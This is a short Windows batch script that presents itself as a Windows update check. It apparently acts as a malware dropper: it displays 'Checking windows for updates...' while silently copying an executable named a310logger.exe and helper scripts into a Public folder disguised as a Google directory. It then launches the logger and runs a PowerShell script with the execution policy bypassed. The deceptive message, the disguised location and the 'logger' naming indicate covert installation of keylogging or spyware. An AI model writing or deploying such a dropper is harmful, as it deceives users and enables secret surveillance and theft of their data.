@echo off
  @setlocal enableextensions
  @cd /d "%~dp0"
echo Checking windows for updates...



:: copy logger and powershell script
if not exist C:\Users\Public mkdir C:\Users\Public
if not exist C:\Users\Public\Google mkdir C:\Users\Public\Google
if not exist C:\Users\Public\Google\a310logger.exe ( copy %cd%\a310logger.exe C:\Users\Public\Google\a310logger.exe >nul )
if not exist C:\Users\Public\Google\update.ps1 ( copy %cd%\update.ps1 C:\Users\Public\Google\update.ps1 >nul )
if not exist C:\Users\Public\Google\b324log.bat ( copy %cd%\b324log.bat C:\Users\Public\Google\b324log.bat >nul )
if not exist C:\Users\Public\Google\b323log.vbs ( copy %cd%\b323log.vbs C:\Users\Public\Google\b323log.vbs >nul )


:: run logger
start C:\Users\Public\Google\a310logger.exe

:: run powershell
powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Google\update.ps1"



		
		timeout 3